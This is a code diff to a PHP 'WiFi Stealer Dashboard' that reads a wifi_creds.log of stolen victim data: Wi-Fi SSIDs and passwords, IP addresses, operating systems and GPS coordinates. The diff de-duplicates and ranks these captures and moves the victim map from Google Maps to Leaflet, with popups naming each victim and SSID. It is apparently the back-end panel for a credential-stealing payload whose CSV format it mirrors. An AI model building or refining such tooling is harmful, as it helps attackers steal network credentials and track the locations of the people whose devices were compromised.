@@ -5,19 +5,6 @@ $logFile = __DIR__ . '/wifi_creds.log';
 
 /**
  * Parse a single CSV capture line into a normalized array.
- *
- * CSV order (must match payload):
- *  0: Timestamp
- *  1: Victim ID
- *  2: SSID
- *  3: Password
- *  4: Victim LAN IP
- *  5: Victim OS
- *  6: Public IP
- *  7: Victim LAN extra
- *  8: Latitude
- *  9: Longitude
- * 10: Packet summary
  */
 function parse_capture_line($line)
 {
@@ -250,11 +237,11 @@ usort($parsedEntries, function ($a, $b) {
 });
 
 // De-duplicate for everything (table, stats, rank)
+// Key = victim_id + ssid + password + lat + lon + public_ip
 $captureEntries = [];
 $seenKeys = [];
 
 foreach ($parsedEntries as $entry) {
-    // composite key that defines "same capture"
     $key = $entry['victim_id']
         . '|' . $entry['ssid']
         . '|' . $entry['password']
@@ -269,14 +256,13 @@ foreach ($parsedEntries as $entry) {
     $captureEntries[] = $entry;
 }
 
-// Re-index display idx after de-dup
+// Re-index display idx
 foreach ($captureEntries as $i => &$entry) {
     $entry['idx'] = $i;
 }
 unset($entry);
 
-// --- 7. Stats / rank ---
-
+// --- 7. Stats / rank using unique entries only ---
 $totalCaptures       = count($captureEntries);
 $ssidCount           = [];
 $ipCount             = [];
@@ -337,7 +323,7 @@ foreach ($filteredEntries as $entry) {
 
         $markers[] = [
             'lat'       => (float)$lat,
-            'lng'       => (float)$lon,
+            'lon'       => (float)$lon,
             'ssid'      => $entry['ssid'],
             'victim_id' => $entry['victim_id'],
             'time'      => $entry['time'],
@@ -397,11 +383,17 @@ $jsTotalCaptures = $uniqueRankCount;
     <title>WiFi Stealer Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <!-- Google Maps JS API: put your key here -->
+    <!-- Leaflet + OpenStreetMap (no API key) -->
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+      integrity="sha256-p4NxAoJBhI+u1Lk9wP1U1zP4PaIBbQxX3A6Z5x3oE04="
+      crossorigin=""
+    />
     <script
-      src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY_HERE&callback=initCapturesMap"
-      async
-      defer
+      src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+      integrity="sha256-o9N1j7kCzorZ8M8J3t8C0FqkQ9O9Y6N0wLZ9Z8a5QDY="
+      crossorigin=""
     ></script>
 
     <style>
@@ -676,8 +668,10 @@ $jsTotalCaptures = $uniqueRankCount;
             if (!box) return;
             box.style.display = 'block';
 
-            if (mapInstance) {
-                google.maps.event.trigger(mapInstance, 'resize');
+            if (!mapInstance) {
+                initCapturesMap();
+            } else {
+                mapInstance.invalidateSize();
             }
         }
 
@@ -686,58 +680,50 @@ $jsTotalCaptures = $uniqueRankCount;
             if (box) box.style.display = 'none';
         }
 
-        // Called by Maps API callback
         function initCapturesMap() {
             var mapDiv = document.getElementById('captures-map');
             if (!mapDiv) return;
 
             var markersData = window.captureMarkers || [];
             var defaultLat = 20.5937;
-            var defaultLng = 78.9629;
+            var defaultLon = 78.9629;
             var defaultZoom = 4;
 
             if (markersData.length > 0) {
                 defaultLat = markersData[0].lat;
-                defaultLng = markersData[0].lng;
+                defaultLon = markersData[0].lon;
                 defaultZoom = 5;
             }
 
-            mapInstance = new google.maps.Map(mapDiv, {
-                center: { lat: defaultLat, lng: defaultLng },
-                zoom: defaultZoom,
-                mapTypeId: 'roadmap'
-            });
+            mapInstance = L.map('captures-map').setView([defaultLat, defaultLon], defaultZoom);
 
-            var bounds = new google.maps.LatLngBounds();
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                maxZoom: 19,
+                attribution: '&copy; OpenStreetMap contributors'
+            }).addTo(mapInstance); // [web:191][web:193]
 
+            var bounds = [];
             markersData.forEach(function(m) {
-                if (!m.lat || !m.lng || isNaN(m.lat) || isNaN(m.lng)) return;
-                var pos = { lat: m.lat, lng: m.lng };
-                var marker = new google.maps.Marker({
-                    position: pos,
-                    map: mapInstance,
-                    title: m.ssid + ' / ' + m.victim_id
-                });
-
-                var info = new google.maps.InfoWindow({
-                    content: '<b>Victim:</b> ' + m.victim_id +
-                             '<br><b>SSID:</b> ' + m.ssid +
-                             '<br><b>Time:</b> ' + m.time
-                });
-
-                marker.addListener('click', function() {
-                    info.open(mapInstance, marker);
-                });
-
-                bounds.extend(pos);
+                if (!m.lat || !m.lon || isNaN(m.lat) || isNaN(m.lon)) return;
+                var marker = L.marker([m.lat, m.lon]).addTo(mapInstance);
+                marker.bindPopup(
+                    '<b>Victim:</b> ' + m.victim_id +
+                    '<br/><b>SSID:</b> ' + m.ssid +
+                    '<br/><b>Time:</b> ' + m.time
+                );
+                bounds.push([m.lat, m.lon]);
             });
 
-            if (!bounds.isEmpty()) {
-                mapInstance.fitBounds(bounds);
+            if (bounds.length > 1) {
+                mapInstance.fitBounds(bounds, { padding: [20, 20] });
+            } else if (bounds.length === 1) {
+                mapInstance.setView(bounds[0], 12);
             }
-        }
 
-        window.initCapturesMap = initCapturesMap;
+            setTimeout(function() {
+                mapInstance.invalidateSize();
+            }, 100);
+        }
     </script>
 </head>
 <body>
@@ -790,7 +776,7 @@ $jsTotalCaptures = $uniqueRankCount;
     <div class="card">
         <form method="get" style="display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:4px;">
             <input type="text" name="vid" placeholder="Filter Victim ID"
-                   value="<?php echo h($filter_victim ?? ''); ?>"
+                   value="<?php echo h($filter_victim); ?>"
                    style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
             <input type="text" name="ssid" placeholder="Filter SSID"
                    value="<?php echo h($filter_ssid); ?>"
